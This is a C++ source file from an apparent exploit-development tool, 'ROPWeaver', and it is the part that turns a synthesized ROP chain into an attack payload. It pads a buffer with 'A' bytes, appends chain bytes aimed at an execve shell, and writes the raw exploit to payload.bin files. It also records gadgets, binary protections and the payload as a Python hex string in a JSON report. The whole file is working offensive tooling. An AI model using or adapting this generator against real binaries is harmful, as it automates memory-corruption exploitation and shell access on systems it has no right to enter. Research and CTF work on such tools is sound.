#include "payload_gen.h"
#include <iostream>
#include <fstream>
#include <iomanip>
#include <sstream>
#include <stdexcept>
#include "nlohmann/json.hpp"
#include <ctime>
#include <filesystem>

using json = nlohmann::json;

// ANSI escape codes for coloring
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_ORANGE  "\033[33m"
#define ANSI_COLOR_RESET   "\x1b[0m"

// Utility function
std::vector<char> pack64(uint64_t n) {
    std::vector<char> result(8);
    for (int i = 0; i < 8; ++i) {
        result[i] = static_cast<char>((n >> (8 * i)) & 0xFF);
    }
    return result;
}

// Helper to convert the raw payload bytes to a Python hex string format
std::string to_python_hex(const std::vector<char>& payload) {
    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (char byte : payload) {
        ss << "\\x" << std::setw(2) << static_cast<int>(static_cast<unsigned char>(byte));
    }
    return ss.str();
}

void PayloadGenerator::generate(const ROPChain& chain, size_t paddingSize, const std::string& filename,
                                const std::vector<Gadget>& gadgets,
                                const std::string& architecture,
                                const std::string& fileType,
                                const json& protections,
                                const std::string& customReportId,
                                const std::string& fileHash) {
    // --- 1. Construct the Raw Payload ---
    std::vector<char> chain_bytes = chain.getPayloadBytes();
    std::vector<char> payload;
    bool has_chain = !chain_bytes.empty();

    if (has_chain) {
        payload.assign(paddingSize, 'A');
        payload.insert(payload.end(), chain_bytes.begin(), chain_bytes.end());
    }

    // --- 2. Construct the Comprehensive JSON Report ---
    json report = json::object();
    std::time_t now = std::time(nullptr);

    try {
        // Basic Metadata
        if (!customReportId.empty()) {
            report["report_id"] = customReportId;
        } else {
            report["report_id"] = "ROPW-" + std::to_string(now);
        }
        
        // Convert std::put_time to string via stringstream before assigning
        std::stringstream ss;
        ss << std::put_time(std::gmtime(&now), "%Y-%m-%dT%H:%M:%SZ");
        report["report_date"] = ss.str();
        
        report["tool_version"] = "ROPWeaver_v1.3.0";
        report["architecture"] = architecture;
        report["file_type"] = fileType;

        if (protections.empty()) {
            // Build a default protections block
            if (fileType == "PE") {
                report["protections"] = {
                    {"DEP_NX",        false},
                    {"ASLR_PIE",      false},
                    {"GS_Canary",     false},
                    {"HighEntropyVA", false},
                    {"CFG",           false},
                    {"SafeSEH_NoSEH", false}
                };
            } else {
                report["protections"] = {
                    {"NX",     false},
                    {"PIE",    false},
                    {"Canary", false},
                    {"RELRO",  "None"}
                };
            }
        } else {
            // For PE binaries, strip out RELRO if inadvertently included
            if (fileType == "PE") {
                json pe_prots = protections;
                pe_prots.erase("RELRO"); // RELRO is ELF-only; never output for PE
                report["protections"] = pe_prots;
            } else {
                report["protections"] = protections;
            }
        }

        report["target_binary"] = {
            {"filename", filename},
            {"hash", fileHash.empty() ? filename : fileHash},
            {"sha256", fileHash}
        };
        
        // ROP Chain Details
        report["rop_chain_generation"] = {
            {"status", chain_bytes.empty() ? "Failure" : "Success (Execve-Shell)"}, 
            {"target_syscall", "execve"},
            {"chain_notes", "Attempted ROP chain generation."},
        };
        
        report["rop_chain_details"] = chain.toJson(); 
        
        // Discovered Gadgets with multi-dimensional classification
        json gadgetsArr = json::array();
        for (const auto& g : gadgets) {
            std::stringstream addrSs;
            addrSs << "0x" << std::hex << std::setw(16) << std::setfill('0') << g.address;

            std::string instrStr;
            for (size_t i = 0; i < g.instructions.size(); ++i) {
                instrStr += g.instructions[i].mnemonic;
                if (!g.instructions[i].op_str.empty()) instrStr += " " + g.instructions[i].op_str;
                if (i + 1 < g.instructions.size()) instrStr += " ; ";
            }

            json gadgetEntry = {
                {"address",       addrSs.str()},
                {"gadget",        instrStr},
                {"instructions",  instrStr},
                // Backward-compat single category
                {"category",      g.category.empty() ? "others" : g.category},
            };

            // Multi-dimensional categories (new field)
            if (!g.categories.empty()) {
                gadgetEntry["categories"] = g.categories;
            } else {
                gadgetEntry["categories"] = json::array({g.category.empty() ? "others" : g.category});
            }

            // Register effect metadata
            if (!g.registers_read.empty())     gadgetEntry["registers_read"]     = g.registers_read;
            if (!g.registers_modified.empty()) gadgetEntry["registers_modified"] = g.registers_modified;

            // Stack and control-flow metadata
            gadgetEntry["stack_delta"]              = g.stack_delta;
            gadgetEntry["has_memory_read"]          = g.has_memory_read;
            gadgetEntry["has_memory_write"]         = g.has_memory_write;
            gadgetEntry["terminator_type"]          = g.terminator_type.empty() ? "UNKNOWN" : g.terminator_type;
            gadgetEntry["instruction_count"]        = g.instruction_count;
            gadgetEntry["classification_confidence"]= g.classification_confidence;
            gadgetEntry["byte_verified"]            = g.byte_verified;

            gadgetsArr.push_back(gadgetEntry);
        }
        report["gadgets"] = gadgetsArr;

        // Final Raw Payload Data
        if (!has_chain) {
            report["raw_payload"] = {
                {"status", "Payload Generation Incomplete - No ROP Chain Synthesized"},
                {"format", "N/A"},
                {"data", ""},
                {"padding_size", paddingSize}
            };
        } else {
            report["raw_payload"] = {
                {"status", "Success"},
                {"format", "python_hex_string"},
                {"data", to_python_hex(payload)},
                {"padding_size", paddingSize}
            };
        }

    } catch (const std::exception& e) {
        std::cerr << "[x] JSON Report Generation Error: " << e.what() << std::endl;
        return; 
    }

    // --- 3. Write the JSON Report File ---
    const std::string REPORT_PATH = "reports/output.json";
    std::error_code ec;
    std::filesystem::create_directories(std::filesystem::path(REPORT_PATH).parent_path(), ec);
    std::ofstream outfile(REPORT_PATH);

    if (outfile.is_open()) {
        outfile << report.dump(4);
        outfile.close();
        std::cout << ANSI_COLOR_GREEN << "[+] Comprehensive report written to: " 
                  << REPORT_PATH << ANSI_COLOR_RESET << std::endl;
    } else {
        std::cerr << ANSI_COLOR_RESET << "[x] FATAL ERROR: Could not open file for writing: " 
                  << REPORT_PATH << ".\n(Check 'reports/' folder permissions.)" << std::endl;
        return;
    }

    // --- 4. Write Raw Exploit Payload Files (payload.bin and reports/payload.bin) ---
    if (has_chain && !payload.empty()) {
        std::string payloadBinReports = "reports/payload.bin";
        std::ofstream binFile(payloadBinReports, std::ios::binary);
        if (binFile.is_open()) {
            binFile.write(payload.data(), payload.size());
            binFile.close();
            std::cout << ANSI_COLOR_GREEN << "[+] Raw exploit payload written to: " 
                      << payloadBinReports << ANSI_COLOR_RESET << std::endl;
        }

        std::ofstream binFileCwd("payload.bin", std::ios::binary);
        if (binFileCwd.is_open()) {
            binFileCwd.write(payload.data(), payload.size());
            binFileCwd.close();
            std::cout << ANSI_COLOR_GREEN << "[+] Exploit payload also saved to: payload.bin" 
                      << ANSI_COLOR_RESET << std::endl;
        }
    } else {
        std::cout << ANSI_COLOR_ORANGE << "[!] Skipping payload.bin export: No ROP chain synthesized." 
                  << ANSI_COLOR_RESET << std::endl;
    }
}